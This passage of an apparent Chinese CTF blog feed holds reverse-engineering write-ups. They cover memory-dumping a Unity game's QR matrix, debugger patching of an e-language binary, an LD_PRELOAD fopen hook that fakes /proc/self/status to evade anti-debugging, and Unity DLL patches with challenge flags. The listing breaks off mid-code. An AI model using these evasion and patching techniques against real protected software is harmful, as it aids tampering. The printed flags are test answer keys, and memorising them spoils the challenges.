class="line">this + 0x34 → origin</span><br><span class="line">this + 0x40 → thickness</span><br><span class="line">this + 0x48 → qrMatrix</span><br></pre></td></tr></table></figure><p>直接在 CE 里：</p><ol><li><p>右键 → 「转到地址」；</p></li><li><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RCX+48</span><br></pre></td></tr></table></figure></li><li><p>看这一处存的 8 字节内容，就是一个<strong>指针</strong>（qrMatrix 对象地址）。</p></li></ol><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052135975.png" alt="image-20251105213503882"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052135908.png" alt="image-20251105213517821"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052135876.png" alt="image-20251105213543762"></p><p>可以看到下面全是01字节</p><p><strong>第七步：跟进 qrMatrix</strong></p><p>右键这 8 字节 → 「在内存中查看此地址」。这里是 <code>int[,]</code> 结构体：</p><p>一般是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00: vtable指针</span><br><span class="line">08: rank (维度)</span><br><span class="line">10: length1</span><br><span class="line">14: length2</span><br><span class="line">18: 数据区...</span><br></pre></td></tr></table></figure><p>（不同 Unity 版本可能略有不同）</p><p>能看到成片的 <code>00 00 00 00</code> &#x2F; <code>01 00 00 00</code> 模式，这就是二维码的黑白格。</p><p><strong>第八步：dump</strong></p><p>save指定内存区域</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052136460.png" alt="image-20251105213644382"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052137632.png" alt="image-20251105213734518"></p><p>这个49 03 是<strong>元素总数 <code>0x349 = 841</code>（小端的 <code>49 03 00 00</code>）</strong>，841 是 29×29，说明这是一个 29×29 的二维码矩阵</p><p>我们从这四个字节后开始dump</p><p>定位到 <code>49 03 00 00</code> 这一段的地址是 **<code>200D898A018</code>**。这说明这是二维码矩阵数据前面的计数字段（841个元素）。</p><p>我们要从它<strong>后面紧接着的 <code>01 00 00 00 ...</code> 开始 dump</strong>，长度大约 841 × 4 字节。</p><p>自己算下，然后填进去就可以dump了</p><p>把ce的头去掉就是这样的</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052143344.png" alt="image-20251105214357210"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">dump_path = Path(<span class="string">&quot;dump.bin&quot;</span>)      <span class="comment"># 你的dump文件</span></span><br><span class="line">out_path  = Path(<span class="string">&quot;qr.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">SIZE = <span class="number">29</span></span><br><span class="line">COUNT = SIZE * SIZE  <span class="comment"># 841</span></span><br><span class="line"></span><br><span class="line">raw = dump_path.read_bytes()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_segment</span>(<span class="params">data: <span class="built_in">bytes</span>, count: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;在所有字节对齐(0..3)下，寻找长度为 count、元素仅为&#123;0,1&#125;的 int32 段&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> align <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) - align &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 裁成4字节对齐长度</span></span><br><span class="line">        usable = data[align: <span class="built_in">len</span>(data) - ((<span class="built_in">len</span>(data) - align) % <span class="number">4</span>)]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(usable) &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        ints = np.frombuffer(usable, dtype=<span class="string">&quot;&lt;i4&quot;</span>)</span><br><span class="line">        <span class="comment"># 完全匹配</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ints) == count <span class="keyword">and</span> np.<span class="built_in">all</span>((ints == <span class="number">0</span>) | (ints == <span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">return</span> ints</span><br><span class="line">        <span class="comment"># 滑窗搜索</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ints) &gt;= count:</span><br><span class="line">            mask01 = (ints == <span class="number">0</span>) | (ints == <span class="number">1</span>)</span><br><span class="line">            valid = mask01.astype(np.int32)</span><br><span class="line">            csum = np.cumsum(valid)</span><br><span class="line">            wins = csum[count-<span class="number">1</span>:] - np.concatenate(([<span class="number">0</span>], csum[:-count]))</span><br><span class="line">            idxs = np.where(wins == count)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> idxs.size &gt; <span class="number">0</span>:</span><br><span class="line">                start = <span class="built_in">int</span>(idxs[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">return</span> ints[start:start+count]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">seg = extract_segment(raw, COUNT)</span><br><span class="line"><span class="keyword">if</span> seg <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未在 dump 中找到连续的 0/1 int32 段；请检查 dump 起点/长度&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 -&gt; 黑(0)，0 -&gt; 白(255)</span></span><br><span class="line">matrix = seg.reshape(SIZE, SIZE).astype(np.uint8)</span><br><span class="line">img = np.where(matrix == <span class="number">1</span>, <span class="number">0</span>, <span class="number">255</span>).astype(np.uint8)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 放大保存</span></span><br><span class="line">scale = <span class="number">20</span></span><br><span class="line">img_big = cv2.resize(img, (SIZE*scale, SIZE*scale), interpolation=cv2.INTER_NEAREST)</span><br><span class="line">cv2.imwrite(<span class="built_in">str</span>(out_path), img_big)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;saved&quot;</span>, out_path)</span><br></pre></td></tr></table></figure><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052144289.png" alt="image-20251105214442184"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NSSCTF-2025-re-wp&quot;&gt;&lt;a href=&quot;#NSSCTF-2025-re-wp&quot; class=&quot;headerlink&quot; title=&quot;NSSCTF 2025 re wp&quot;&gt;&lt;/a&gt;NSSCTF 2025 re wp&lt;/h1&gt;&lt;h2 id=&quot;ez-te</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>IDA e语言逆向初探-以一道CTF题为例</title>
    <link href="http://matriy330.github.io/1e7e61d9/"/>
    <id>http://matriy330.github.io/1e7e61d9/</id>
    <published>2025-11-04T14:21:38.000Z</published>
    <updated>2025-11-05T14:21:37.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDA-e语言逆向初探-以一道CTF题为例"><a href="#IDA-e语言逆向初探-以一道CTF题为例" class="headerlink" title="IDA e语言逆向初探-以一道CTF题为例"></a>IDA e语言逆向初探-以一道CTF题为例</h1><p>题目附件可以留言找我拿</p><p><a href="https://www.52pojie.cn/thread-1684608-1-1.html">IDA易语言反编译插件E-Decompiler - 吾爱破解 - 52pojie.cn</a></p><p>e语言逆向，安装这个插件然后运行IDA分析</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011541782.png" alt="image-20251101154058677"></p><p>转到可疑函数</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011541355.png" alt="image-20251101154136310"></p><p>url解码后是HXB{YAO-YAO-QIE-KE-NAO}</p><p>假的</p><p>还发现</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011542089.png" alt="image-20251101154221060"></p><p>这几个串</p><p>交叉引用过去</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011542531.png" alt="image-20251101154246460"></p><p>有点像校验了</p><p>sub_404196应该是加密函数</p><p>有点像rc系列的加密，不知道是不是Rc4，可以猜测它为流加密的算法</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011543730.png" alt="image-20251101154334665"></p><p>如果是流加密的算法最好的解密方式就是再跑一边，看看动调能不能出</p><p>x32dbg打开，直接断点到这个大函数调试</p><blockquote><p>调试可能有反调试，注意开下sharpod这个插件</p></blockquote><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011544090.png" alt="image-20251101154451016"></p><p>基于假设我们可以试试看直接把密文patch回去</p><p>可以看到我输入的123</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011545025.png" alt="image-20251101154543966"></p><p>下面在ebp-4的地方是密文</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011551307.png" alt="image-20251101155142275"></p><p>在内存中修改为下面那段，注意的是patch记得别把最后的00字节给删了</p><p>要修改的字节粘贴进去这个串</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011715416.png" alt="image-20251101171551338"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011716048.png" alt="image-20251101171626417"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011717691.png" alt="image-20251101171729638"></p><p>一开始patch错了patch的第一个字符是88，后面也没保存结果所以是HXB{HAHA-HEHE-HEIHEI-HUOHUO-XIXI}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&quot;49,58,42,7B,48,41,48,41,2D,48,45,48,45,2D,48,45,49,48,45,49,2D,48,55,4F,48,55,4F,2D,58,49,58,49,7D,&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">bytes</span>(<span class="built_in">int</span>(x, <span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> enc.strip(<span class="string">&#x27;,&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="string">b&#x27;IXB&#123;HAHA-HEHE-HEIHEI-HUOHUO-XIXI&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>走59XXX这个分支是</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011611900.png" alt="image-20251101161130858"></p><p>根据判断，一个是打开资源管理器，另一个是搞一个yaoyaoqiekenao的fake password</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDA-e语言逆向初探-以一道CTF题为例&quot;&gt;&lt;a href=&quot;#IDA-e语言逆向初探-以一道CTF题为例&quot; class=&quot;headerlink&quot; title=&quot;IDA e语言逆向初探-以一道CTF题为例&quot;&gt;&lt;/a&gt;IDA e语言逆向初探-以一道CTF题为例&lt;/</summary>
      
    
    
    
    <category term="Re" scheme="http://matriy330.github.io/categories/Re/"/>
    
    
    <category term="Re" scheme="http://matriy330.github.io/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>一道题浅析LD_PRELOAD文件劫持 /proc/self/status反反调试</title>
    <link href="http://matriy330.github.io/b6dfbc54/"/>
    <id>http://matriy330.github.io/b6dfbc54/</id>
    <published>2025-10-26T11:32:14.000Z</published>
    <updated>2025-10-30T12:56:25.484Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一道题浅析LD-PRELOAD文件劫持-proc-self-status反反调试"><a href="#一道题浅析LD-PRELOAD文件劫持-proc-self-status反反调试" class="headerlink" title="一道题浅析LD_PRELOAD文件劫持 &#x2F;proc&#x2F;self&#x2F;status反反调试"></a>一道题浅析LD_PRELOAD文件劫持 &#x2F;proc&#x2F;self&#x2F;status反反调试</h1><p>这是Geekgame2025的一道逆向题，需要附件联系我</p><p>其中里面有打开&#x2F;proc&#x2F;self&#x2F;status的反调试，对于这题来说很简单，我们修改stack或者patch直接让v1为0均可</p><p>但是为了学习，可以了解下LD_PRELOAD文件劫持实现反反调试</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251025111805942.png" alt="image-20251025111805942"></p><p>可以看下调试时的pid</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251024212657134.png" alt="image-20251024212657134"></p><p>对于本题很简单，ai直接给出脚本即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hide_tracer.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> FILE *(*<span class="type">fopen_t</span>)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">fopen_t</span> real_fopen = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成一个假的 /proc/self/status 内容，其中保证包含 TracerPid: 0 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> fake_status[] =</span><br><span class="line"><span class="string">&quot;Name:\tmyproc\n&quot;</span></span><br><span class="line"><span class="string">&quot;State:\tR (running)\n&quot;</span></span><br><span class="line"><span class="string">&quot;Pid:\t1234\n&quot;</span></span><br><span class="line"><span class="string">&quot;PPid:\t1\n&quot;</span></span><br><span class="line"><span class="string">&quot;TracerPid:\t0\n&quot;</span>   <span class="comment">/* &lt;-- 关键：返回 0 表示未被调试 */</span></span><br><span class="line"><span class="string">&quot;Uid:\t1000\t1000\t1000\t1000\n&quot;</span></span><br><span class="line"><span class="string">&quot;VmSize:\t0 kB\n&quot;</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 替换 fopen，只在 path == &quot;/proc/self/status&quot; 时返回内存 FILE* */</span></span><br><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *mode)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!real_fopen) &#123;</span><br><span class="line">        real_fopen = (<span class="type">fopen_t</span>)dlsym(RTLD_NEXT, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path &amp;&amp; <span class="built_in">strcmp</span>(path, <span class="string">&quot;/proc/self/status&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* fmemopen 在 glibc 可用：把字符串当作 FILE* 返回 */</span></span><br><span class="line">        <span class="comment">/* 注意：fmemopen 需要可写缓冲区，因此复制一份到 malloc 的区域 */</span></span><br><span class="line">        <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fake_status));</span><br><span class="line">        <span class="keyword">if</span> (!buf) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, fake_status, <span class="keyword">sizeof</span>(fake_status));</span><br><span class="line">        <span class="keyword">return</span> fmemopen(buf, <span class="keyword">sizeof</span>(fake_status) - <span class="number">1</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 其他文件按真实 fopen 处理 */</span></span><br><span class="line">    <span class="keyword">return</span> real_fopen(path, mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要用IDA进行远程调试这里有个坑点就是</p><p>远程调试需要用这个命令去设置环境变量启动调试器，在Parameters里设置没有用!!!：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o hide_tracer.so hide_tracer.c -ldl</span><br><span class="line">LD_PRELOAD=/home/matriy/RE/TSCTF/hide_tracer.so ./linux_server64</span><br></pre></td></tr></table></figure><p>此外写出代码很简单，我们也需要了解背后机理：</p><p>当设置了 <code>LD_PRELOAD=/path/to/hook.so</code> 时，Linux 动态链接器在加载程序时会<strong>优先加载这个库，并把里面的同名函数符号放在最前面</strong>。</p><p>所以当程序调用 <code>fopen()</code> 时，**动态链接器解析符号时先找到库里的 <code>fopen</code>**，就直接调用你写的函数，而不是 libc 的版本。</p><p>符号解析顺序（优先级）大致如下：</p><ol><li><strong>主程序（main ELF）</strong></li><li><strong><code>LD_PRELOAD</code> 指定的库（最高优先）</strong> </li><li><strong>其他依赖库（按照 ELF 的依赖顺序）</strong></li><li><strong>libc.so.6（系统 C 标准库）</strong></li><li><strong>ld-linux 自身</strong></li></ol><p>在我们的代码中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!real_fopen) &#123;</span><br><span class="line">    real_fopen = (<span class="type">fopen_t</span>)<span class="built_in">dlsym</span>(RTLD_NEXT, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这行的作用是说：</p><blockquote><p>找下一个名为 <code>fopen</code> 的实现（也就是 libc 里的真正 fopen）</p></blockquote><p><code>RTLD_NEXT</code> 代表：</p><blockquote><p>从当前库之后继续查找同名符号。</p></blockquote><p>于是就能在 hook 函数里调用原版函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return real_fopen(path, mode);</span><br></pre></td></tr></table></figure><p>也就是说调试时会先找到我的fopen，调用我的这个函数，然后我去找真实的函数，并判断调用这个函数的path是否是&#x2F;proc&#x2F;self&#x2F;status</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一道题浅析LD-PRELOAD文件劫持-proc-self-status反反调试&quot;&gt;&lt;a href=&quot;#一道题浅析LD-PRELOAD文件劫持-proc-self-status反反调试&quot; class=&quot;headerlink&quot; title=&quot;一道题浅析LD_PREL</summary>
      
    
    
    
    <category term="Re" scheme="http://matriy330.github.io/categories/Re/"/>
    
    
    <category term="Re" scheme="http://matriy330.github.io/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>GeekGame 2025 re wp</title>
    <link href="http://matriy330.github.io/fab00bb3/"/>
    <id>http://matriy330.github.io/fab00bb3/</id>
    <published>2025-10-25T10:22:34.000Z</published>
    <updated>2025-10-30T12:55:42.003Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GeekGame-2025-re-wp"><a href="#GeekGame-2025-re-wp" class="headerlink" title="GeekGame 2025 re wp"></a>GeekGame 2025 re wp</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020200147600.png" alt="image-20251020200147600"></p><p>在线网站把所有帧提出来，第一个帧是背景可以写个妙妙小脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageChops</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件名</span></span><br><span class="line">background_path = <span class="string">&quot;1.png&quot;</span></span><br><span class="line">layers = [<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.png&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取背景图</span></span><br><span class="line">background = Image.<span class="built_in">open</span>(background_path).convert(<span class="string">&quot;L&quot;</span>)  <span class="comment"># 转灰度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一个全白背景</span></span><br><span class="line">result = Image.new(<span class="string">&quot;L&quot;</span>, background.size, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理每一层</span></span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> layers:</span><br><span class="line">    img = Image.<span class="built_in">open</span>(path).convert(<span class="string">&quot;L&quot;</span>)</span><br><span class="line">    <span class="comment"># 与背景做差</span></span><br><span class="line">    diff = ImageChops.difference(img, background)</span><br><span class="line">    diff_np = np.array(diff)</span><br><span class="line">    <span class="comment"># 阈值分割：差异大的设为黑（0），其余设为白（255）</span></span><br><span class="line">    mask = np.where(diff_np &gt; <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>).astype(np.uint8)</span><br><span class="line">    <span class="comment"># 与结果图按位与（取黑色部分）</span></span><br><span class="line">    result_np = np.minimum(np.array(result), mask)</span><br><span class="line">    result = Image.fromarray(result_np)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存结果</span></span><br><span class="line">result.save(<span class="string">&quot;decoded.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;✅ 已生成 decoded.png (白底黑码)&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020215237690.png" alt="image-20251020215237690"></p><p>然后在线网站DataMatrix提取flag</p><p>flag{see!!the-wind-of-miss-yooou-around-finally-blowwws-to-geek-game~~~}</p><p>二阶段提示：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251024172251071.png" alt="image-20251024172251071"></p><p>测了下ChatGPT白色背景没识别，可能要透明</p><p>夸克可以扫出来</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="人机大战"><a href="#人机大战" class="headerlink" title="人机大战"></a>人机大战</h3><h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020204639945.png" alt="image-20251020204639945"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dont-laugh-you-try-you-also-cant-beat-the-second-level&#125;</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="团结引擎"><a href="#团结引擎" class="headerlink" title="团结引擎"></a>团结引擎</h3><p>flag13可以通过patch dll来，encodeText种有个揭秘字符串的操作，直接patch右键添加这一个日志操作，打印出来，编译然后左上角生成dll</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018150745803.png" alt="image-20251018150745803"></p><p>替换原先的，运行dll就行了</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018150840562.png" alt="image-20251018150840562"></p><ul><li>flag{gam4_ed2tor_pro}</li><li>flag{T2me_M0GIC5him}</li></ul><p>猜测也能通过飞天来找这两个flag</p><p>还有个没找到估计在墙里</p><p>flag1可以修改Unity.StarterAssets的ThirdPersonController</p><blockquote><p>当然更简单的做法是直接让门升起来，我这么做只是好玩.</p><p>如door可以直接加start方法</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Door2</span></span><br><span class="line"><span class="comment">// Token: 0x06000162 RID: 354</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>._openingTriggered = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.countdownText)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.countdownText.text = <span class="string">&quot;Opening&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>._mountedObject)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>._mountedObject.localPosition = <span class="keyword">this</span>._mountedTargetPos;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>patch成飞天</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 